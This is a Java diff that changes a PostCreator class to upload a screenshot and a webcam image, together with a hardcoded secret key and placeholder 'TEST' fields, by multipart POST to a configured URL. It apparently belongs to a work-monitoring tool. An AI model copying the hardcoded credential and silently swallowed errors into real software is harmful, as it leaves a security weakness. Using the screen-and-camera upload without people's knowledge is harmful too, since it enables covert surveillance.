@@ -1,14 +1,13 @@
 import java.io.File;
 import org.apache.http.HttpEntity;
-import org.apache.http.client.methods.CloseableHttpResponse;
+import org.apache.http.client.HttpClient;
 import org.apache.http.client.methods.HttpPost;
-import org.apache.http.entity.ContentType;
 import org.apache.http.entity.mime.MultipartEntityBuilder;
 import org.apache.http.entity.mime.content.FileBody;
 import org.apache.http.entity.mime.content.StringBody;
+import org.apache.http.impl.client.DefaultHttpClient;
 import org.apache.http.impl.client.CloseableHttpClient;
-import org.apache.http.impl.client.HttpClients;
-import org.apache.http.util.EntityUtils;
+
 
 public class PostCreator {
 	private String url;
@@ -24,19 +23,26 @@ public class PostCreator {
 
 	public void send() {
 		System.out.println("[*] Preparing request");
-		CloseableHttpClient http_client = HttpClients.createDefault();
+		CloseableHttpClient http_client = new DefaultHttpClient();
 		try {
 			HttpPost http_post = new HttpPost(this.url);
-			FileBody screen_file = new FileBody(new File(this.screen_img));
-			HttpEntity request_entity = MultipartEntityBuilder.create().addPart("screen_img", screen_file).build();
-			http_post.setEntity(request_entity);
-			CloseableHttpResponse response = http_client.execute(http_post);
-			try {
-				HttpEntity response_entity = response.getEntity();
-				EntityUtils.consume(response_entity);
-			} catch (Exception e1) {} finally {
-				response.close();
-			}
+			MultipartEntityBuilder mpe = MultipartEntityBuilder.create();
+
+			File screen_file = new File(this.screen_img);
+			File camera_file = new File(this.camera_img);
+			StringBody secret_key = new StringBody("804e33bcd2dfc0cb435fe64ce20646fe");
+			StringBody date = new StringBody("TEST");
+			StringBody project_name = new StringBody("TEST PROJECT");
+
+			mpe.addPart("secret_key",secret_key);
+			mpe.addPart("date",date);
+			mpe.addPart("project_name",project_name);
+			mpe.addBinaryBody("screen_img",screen_file);
+			mpe.addBinaryBody("camera_img",camera_file);
+
+			HttpEntity request = mpe.build();
+			http_post.setEntity(request);
+			http_client.execute(http_post);
 		} catch (Exception e2) {} finally {
 			try { http_client.close(); } catch (Exception e3) {}
 		}
